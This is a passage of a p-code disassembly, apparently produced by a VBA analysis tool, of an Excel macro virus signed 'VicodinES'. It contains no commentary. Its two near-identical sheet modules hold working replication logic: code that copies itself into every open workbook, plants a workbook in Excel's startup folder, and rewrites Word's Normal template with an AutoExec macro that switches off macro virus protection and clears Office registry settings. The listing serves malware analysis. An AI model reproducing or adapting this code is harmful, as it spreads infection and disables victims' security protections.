' 	Ld yz 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St VCode 
' 	EndIf 
' Line #26:
' 	Ld VCode 
' 	FnLen 
' 	LitDI2 0x0BB8 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	GoTo out 
' 	EndIf 
' Line #27:
' 	EndIfBlock 
' Line #28:
' 	StartForVariable 
' 	Ld yz 
' 	EndForVariable 
' 	NextVar 
' Line #29:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #30:
' 	Label out 
' Line #31:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x0007 "\Book1."
' 	Add 
' 	ArgsLd Dir 0x0001 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0005 "Book1"
' 	ArgsLd UCase 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St PXLS 
' 	EndIf 
' Line #32:
' 	Ld PXLS 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld run1 
' 	LitVarSpecial (True)
' 	Ne 
' 	And 
' 	IfBlock 
' Line #33:
' 	LitVarSpecial (True)
' 	St run1 
' Line #34:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x0007 "\Book1."
' 	Concat 
' 	ParamNamed FileName 
' 	Ld xlNormal 
' 	ParamNamed FileFormat 
' 	LitVarSpecial (False)
' 	ParamNamed AddToMru 
' 	Ld Workbooks 
' 	MemLd Add 
' 	ArgsMemCall SaveAs 0x0003 
' Line #35:
' 	EndIfBlock 
' Line #36:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Workbooks 
' 	MemLd Count 
' 	For 
' Line #37:
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St WeIn 
' Line #38:
' 	Ld WeIn 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #39:
' 	LitStr 0x001E "Public run1, didvic As Boolean"
' 	Ld v1 
' 	Concat 
' 	LitStr 0x003F "Private Sub Workbook_WindowDeactivate(ByVal Wn As Excel.Window)"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	Ld VCode 
' 	Concat 
' 	Paren 
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #40:
' 	EndIfBlock 
' Line #41:
' 	StartForVariable 
' 	Ld yy 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #42:
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St Weins1 
' Line #43:
' 	Ld Weins1 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #44:
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd TypeOf 
' 	LitDI2 0x0064 
' 	Eq 
' 	IfBlock 
' Line #45:
' 	LitStr 0x001E "Public run1, didvic As Boolean"
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0020 "Private Sub Worksheet_Activate()"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	Ld VCode 
' 	Concat 
' 	Paren 
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #46:
' 	Ld Weins1 
' 	LitDI2 0x0001 
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #47:
' 	EndIfBlock 
' Line #48:
' 	EndIfBlock 
' Line #49:
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd TypeOf 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #50:
' 	Ld Weins1 
' 	Paren 
' 	LitDI2 0x0018 
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St findvic 
' Line #51:
' 	LitDI2 0x0001 
' 	Ld findvic 
' 	LitStr 0x0009 "VicodinES"
' 	FnInStr3 
' 	LitDI2 0x0002 
' 	Ne 
' 	Ld didvic 
' 	LitVarSpecial (True)
' 	Ne 
' 	And 
' 	IfBlock 
' Line #52:
' 	Ld Weins1 
' 	LitDI2 0x0001 
' 	Add 
' 	Paren 
' 	LitStr 0x0018 "Private Sub Auto_Close()"
' 	Ld v1 
' 	Concat 
' 	LitStr 0x001C "For x = 1 To Workbooks.Count"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0037 "For yz = 1 To Workbooks(x).VBProject.VBComponents.Count"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x004D "Weins1 = Workbooks(x).VBProject.VBComponents.Item(yz).CodeModule.CountOfLines"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x003F "If Workbooks(x).VBProject.VBComponents.Item(yz).Type = 100 Then"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x001F "If Weins1 > 30 Then OKEY = True"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0006 "End If"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0007 "Next yz"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0006 "Next x"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0014 "If OKEY <> True Then"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x004E "If UCase(Dir("c:\" & Application.UserName)) = UCase(Application.UserName) Then"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x007A "Workbooks(Workbooks.Count).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.AddFromFile "c:\" & Application.UserName"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0062 "Workbooks(Workbooks.Count).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.DeleteLines 1, 4"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0004 "Else"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x004C "MsgBox "Why Did You Remove Sugar.Poppy?", vbQuestion, "VicodinES wonders...""
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0006 "End If"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0006 "End If"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0007 "End Sub"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x000A "'VicodinES"
' 	Concat 
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #53:
' 	LitVarSpecial (True)
' 	St didvic 
' Line #54:
' 	ElseBlock 
' Line #55:
' 	LitVarSpecial (True)
' 	St didvic 
' Line #56:
' 	EndIfBlock 
' Line #57:
' 	EndIfBlock 
' Line #58:
' 	StartForVariable 
' 	Ld yy 
' 	EndForVariable 
' 	NextVar 
' Line #59:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #60:
' 	Ld PXLS 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #61:
' 	ArgsCall (Call) AbuseWord 0x0000 
' Line #62:
' 	LitVarSpecial (True)
' 	ParamNamed SaveChanges 
' 	LitStr 0x0006 "Book1."
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemCall Close 0x0001 
' Line #63:
' 	EndIfBlock 
' Line #64:
' 	EndSub 
' Line #65:
' 	FuncDefn (Private Sub AbuseWord())
' Line #66:
' 	OnError (Resume Next) 
' Line #67:
' 	SetStmt 
' 	ParamOmitted 
' 	LitStr 0x0010 "Word.Application"
' 	ArgsLd GetObject 0x0002 
' 	Set WordObj 
' Line #68:
' 	Ld WordObj 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #69:
' 	SetStmt 
' 	LitStr 0x0010 "Word.Application"
' 	ArgsLd CreateObject 0x0001 
' 	Set WordObj 
' Line #70:
' 	LitVarSpecial (True)
' 	St Quit 
' Line #71:
' 	EndIfBlock 
' Line #72:
' 	SetStmt 
' 	LitStr 0x000C "ThisDocument"
' 	Ld WordObj 
' 	MemLd NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set NT 
' Line #73:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NT 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0004 "'Vic"
' 	FnInStr3 
' 	IfBlock 
' Line #74:
' 	LitStr 0x001C "Normal.ThisDocument.AutoExec"
' 	Ld WordObj 
' 	ArgsMemCall Run 0x0001 
' Line #75:
' 	ElseBlock 
' Line #76:
' 	LitVarSpecial (False)
' 	Ld WordObj 
' 	MemLd Options 
' 	MemSt SaveNormalPrompt 
' Line #77:
' 	LitDI2 0x0001 
' 	Ld NT 
' 	MemLd CountOfLines 
' 	Ld NT 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #78:
' 	LitDI2 0x0001 
' 	LitStr 0x0013 "Sub AutoExec() 'Vic"
' 	Ld NT 
' 	ArgsMemCall InsertLines 0x0002 
' Line #79:
' 	LitDI2 0x0002 
' 	LitStr 0x0043 "System.ProfileString("Options", "EnableMacroVirusProtection") = "0""
' 	Ld NT 
' 	ArgsMemCall InsertLines 0x0002 
' Line #80:
' 	LitDI2 0x0003 
' 	LitStr 0x0079 "System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel", "Options6") = """
' 	Ld NT 
' 	ArgsMemCall InsertLines 0x0002 
' Line #81:
' 	LitDI2 0x0004 
' 	LitStr 0x008C "System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Office\8.0\New User Settings\Excel\Microsoft Excel", "Options6") = """
' 	Ld NT 
' 	ArgsMemCall InsertLines 0x0002 
' Line #82:
' 	LitDI2 0x0005 
' 	LitStr 0x0007 "End Sub"
' 	Ld NT 
' 	ArgsMemCall InsertLines 0x0002 
' Line #83:
' 	LitStr 0x001C "Normal.ThisDocument.AutoExec"
' 	Ld WordObj 
' 	ArgsMemCall Run 0x0001 
' Line #84:
' 	EndIfBlock 
' Line #85:
' 	SetStmt 
' 	LitNothing 
' 	Set NT 
' Line #86:
' 	Ld Quit 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld WordObj 
' 	ArgsMemCall Quit 0x0000 
' 	EndIf 
' Line #87:
' 	EndSub 
' _VBA_PROJECT_CUR/VBA/Sheet13 - 7941 bytes
' Line #0:
' 	Dim (Public) 
' 	VarDefn run1
' 	VarDefn didvic (As Boolean)
' Line #1:
' 	FuncDefn (Private Sub Worksheet_Activate())
' Line #2:
' 	OnError (Resume Next) 
' Line #3:
' 	ArgsCall Read 0x0000 
' Line #4:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	Ld Now 
' 	ArgsLd Minute 0x0001 
' 	Eq 
' 	IfBlock 
' Line #5:
' 	StartForVariable 
' 	Ld y 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x000A 
' 	For 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x001E 
' 	For 
' Line #6:
' 	LitDI2 0x0040 
' 	Ld y 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Ld x 
' 	Concat 
' 	St rng 
' Line #7:
' 	Ld rng 
' 	ArgsLd Range 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #8:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Interior 
' 	With 
' Line #9:
' 	Ld Rnd 
' 	LitDI2 0x0032 
' 	Mul 
' 	FnInt 
' 	Paren 
' 	MemStWith ColorIndex 
' Line #10:
' 	Ld xlSolid 
' 	MemStWith Pattern 
' Line #11:
' 	EndWith 
' Line #12:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld y 
' 	EndForVariable 
' 	NextVar 
' Line #13:
' 	EndIfBlock 
' Line #14:
' 	LitStr 0x0003 "c:\"
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	ArgsLd Dir 0x0001 
' 	ArgsLd UCase 0x0001 
' 	Ld Application 
' 	MemLd UserName 
' 	ArgsLd UCase 0x0001 
' 	Ne 
' 	IfBlock 
' Line #15:
' 	LitStr 0x0003 "c:\"
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld ActiveWorkbook 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #16:
' 	EndIfBlock 
' Line #17:
' 	Ld vbCr 
' 	St v1 
' Line #18:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Workbooks 
' 	MemLd Count 
' 	For 
' Line #19:
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St WeIn 
' Line #20:
' 	Ld WeIn 
' 	LitDI2 0x0000 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0003 
' 	Ld WeIn 
' 	LitDI2 0x0002 
' 	Sub 
' 	Paren 
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St VCode 
' 	EndIf 
' Line #21:
' 	Ld VCode 
' 	FnLen 
' 	LitDI2 0x0BB8 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	GoTo out 
' 	EndIf 
' Line #22:
' 	StartForVariable 
' 	Ld yz 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #23:
' 	Ld yz 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St Weins1 
' Line #24:
' 	Ld yz 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd TypeOf 
' 	LitDI2 0x0064 
' 	Eq 
' 	IfBlock 
' Line #25:
' 	Ld Weins1 
' 	LitDI2 0x0000 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0003 
' 	Ld Weins1 
' 	LitDI2 0x0002 
' 	Sub 
' 	Paren 
' 	Ld yz 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St VCode 
' 	EndIf 
' Line #26:
' 	Ld VCode 
' 	FnLen 
' 	LitDI2 0x0BB8 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	GoTo out 
' 	EndIf 
' Line #27:
' 	EndIfBlock 
' Line #28:
' 	StartForVariable 
' 	Ld yz 
' 	EndForVariable 
' 	NextVar 
' Line #29:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #30:
' 	Label out 
' Line #31:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x0007 "\Book1."
' 	Add 
' 	ArgsLd Dir 0x0001 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0005 "Book1"
' 	ArgsLd UCase 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St PXLS 
' 	EndIf 
' Line #32:
' 	Ld PXLS 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld run1 
' 	LitVarSpecial (True)
' 	Ne 
' 	And 
' 	IfBlock 
' Line #33:
' 	LitVarSpecial (True)
' 	St run1 
' Line #34:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x0007 "\Book1."
' 	Concat 
' 	ParamNamed FileName 
' 	Ld xlNormal 
' 	ParamNamed FileFormat 
' 	LitVarSpecial (False)
' 	ParamNamed AddToMru 
' 	Ld Workbooks 
' 	MemLd Add 
' 	ArgsMemCall SaveAs 0x0003 
' Line #35:
' 	EndIfBlock 
' Line #36:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Workbooks 
' 	MemLd Count 
' 	For 
' Line #37:
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St WeIn 
' Line #38:
' 	Ld WeIn 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #39:
' 	LitStr 0x001E "Public run1, didvic As Boolean"
' 	Ld v1 
' 	Concat 
' 	LitStr 0x003F "Private Sub Workbook_WindowDeactivate(ByVal Wn As Excel.Window)"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	Ld VCode 
' 	Concat 
' 	Paren 
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #40:
' 	EndIfBlock 
' Line #41:
' 	StartForVariable 
' 	Ld yy 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #42:
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St Weins1 
' Line #43:
' 	Ld Weins1 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #44:
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd TypeOf 
' 	LitDI2 0x0064 
' 	Eq 
' 	IfBlock 
' Line #45:
' 	LitStr 0x001E "Public run1, didvic As Boolean"
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0020 "Private Sub Worksheet_Activate()"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	Ld VCode 
' 	Concat 
' 	Paren 
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #46:
' 	Ld Weins1 
' 	LitDI2 0x0001 
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #47:
' 	EndIfBlock 
' Line #48:
' 	EndIfBlock 
' Line #49:
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd TypeOf 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #50:
' 	Ld Weins1 
' 	Paren 
' 	LitDI2 0x0018 
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St findvic 
' Line #51:
' 	LitDI2 0x0001 
' 	Ld findvic 
' 	LitStr 0x0009 "VicodinES"
' 	FnInStr3 
' 	LitDI2 0x0002 
' 	Ne 
' 	Ld didvic 
' 	LitVarSpecial (True)
' 	Ne 
' 	And 
' 	IfBlock 
' Line #52:
' 	Ld Weins1 
' 	LitDI2 0x0001 
' 	Add 
' 	Paren 
' 	LitStr 0x0018 "Private Sub Auto_Close()"
' 	Ld v1 
' 	Concat 
' 	LitStr 0x001C "For x = 1 To Workbooks.Count"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0037 "For yz = 1 To Workbooks(x).VBProject.VBComponents.Count"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x004D "Weins1 = Workbooks(x).VBProject.VBComponents.Item(yz).CodeModule.CountOfLines"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x003F "If Workbooks(x).VBProject.VBComponents.Item(yz).Type = 100 Then"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x001F "If Weins1 > 30 Then OKEY = True"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0006 "End If"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0007 "Next yz"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0006 "Next x"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0014 "If OKEY <> True Then"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x004E "If UCase(Dir("c:\" & Application.UserName)) = UCase(Application.UserName) Then"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x007A "Workbooks(Workbooks.Count).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.AddFromFile "c:\" & Application.UserName"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0062 "Workbooks(Workbooks.Count).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.DeleteLines 1, 4"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0004 "Else"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x004C "MsgBox "Why Did You Remove Sugar.Poppy?", vbQuestion, "VicodinES wonders...""
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0006 "End If"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0006 "End If"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0007 "End Sub"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x000A "'VicodinES"
' 	Concat 
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #53:
' 	LitVarSpecial (True)
' 	St didvic 
' Line #54:
' 	ElseBlock 
' Line #55:
' 	LitVarSpecial (True)
' 	St didvic 
' Line #56:
' 	EndIfBlock 
' Line #57:
' 	EndIfBlock 
' Line #58:
' 	StartForVariable 
' 	Ld yy 
' 	EndForVariable 
' 	NextVar 
' Line #59:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #60:
' 	Ld PXLS 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #61:
' 	ArgsCall (Call) AbuseWord 0x0000 
' Line #62:
' 	LitVarSpecial (True)
' 	ParamNamed SaveChanges 
' 	LitStr 0x0006 "Book1."
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemCall Close 0x0001 
' Line #63:
' 	EndIfBlock 
' Line #64:
' 	EndSub 
' Line #65:
' 	FuncDefn (Private Sub AbuseWord())
' Line #66:
' 	OnError (Resume Next) 
' Line #67:
' 	SetStmt 
' 	ParamOmitted 
' 	LitStr 0x0010 "Word.Application"
' 	ArgsLd GetObject 0x0002 
' 	Set WordObj 
' Line #68:
' 	Ld WordObj 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #69:
' 	SetStmt 
' 	LitStr 0x0010 "Word.Application"
' 	ArgsLd CreateObject 0x0001 
' 	Set WordObj 
' Line #70:
' 	LitVarSpecial (True)
' 	St Quit 
' Line #71:
' 	EndIfBlock 
' Line #72:
' 	SetStmt 
' 	LitStr 0x000C "ThisDocument"
' 	Ld WordObj 
' 	MemLd NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set NT 
' Line #73:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NT 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0004 "'Vic"
' 	FnInStr3 
' 	IfBlock 
' Line #74:
' 	LitStr 0x001C "Normal.ThisDocument.AutoExec"
' 	Ld WordObj 
' 	ArgsMemCall Run 0x0001 
' Line #75:
' 	ElseBlock 
' Line #76:
' 	LitVarSpecial (False)
' 	Ld WordObj 
' 	MemLd Options 
' 	MemSt SaveNormalPrompt 
' Line #77:
' 	LitDI2 0x0001 
' 	Ld NT 
' 	MemLd CountOfLines 
' 	Ld NT 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #78:
' 	LitDI2 0x0001 
' 	LitStr 0x0013 "Sub AutoExec() 'Vic"
' 	Ld NT 
' 	ArgsMemCall InsertLines 0x0002 
' Line #79:
' 	LitDI2 0x0002 
' 	LitStr 0x0043 "System.ProfileString("Options", "EnableMacroVirusProtection") = "0""
' 	Ld NT 
' 	ArgsMemCall InsertLines 0x0002 
' Line #80:
' 	LitDI2 0x0003 
' 	LitStr 0x0079 "System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel", "Options6") = """
' 	Ld NT 
' 	ArgsMemCall InsertLines 0x0002 
' Line #81:
' 	LitDI2 0x0004 
' 	LitStr 0x008C "System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Office\8.0\New User Settings\Excel\Microsoft Excel", "Options6") = """
' 	Ld NT 
' 	ArgsMemCall InsertLines 0x0002 
' Line #82:
' 	LitDI2 0x0005 
' 	LitStr 0x0007 "End Sub"
' 	Ld NT 
' 	ArgsMemCall InsertLines 0x0002 
' Line #83:
' 	LitStr 0x001C "Normal.ThisDocument.AutoExec"
' 	Ld WordObj 
' 	ArgsMemCall Run 0x0001 
' Line #84:
' 	EndIfBlock 
' Line #85:
' 	SetStmt 
' 	LitNothing 
' 	Set NT 
' Line #86:
' 	Ld Quit 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld WordObj 
' 	ArgsMemCall Quit 0x0000 
' 	EndIf 
' Line #87:
' 	EndSub 
' _VBA_PROJECT_CUR/VBA/Sheet14 - 7941 bytes
' Line #0:
' 	Dim (Public) 
' 	VarDefn run1
' 	VarDefn didvic (As Boolean)
' Line #1:
' 	FuncDefn (Private Sub Worksheet_Activate())
' Line #2:
' 	OnError (Resume Next) 
' Line #3:
' 	ArgsCall Read 0x0000 
' Line #4:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	Ld Now 
' 	ArgsLd Minute 0x0001 
' 	Eq 
' 	IfBlock 
' Line #5:
' 	StartForVariable 
' 	Ld y 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x000A 
' 	For 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x001E 
' 	For 
' Line #6:
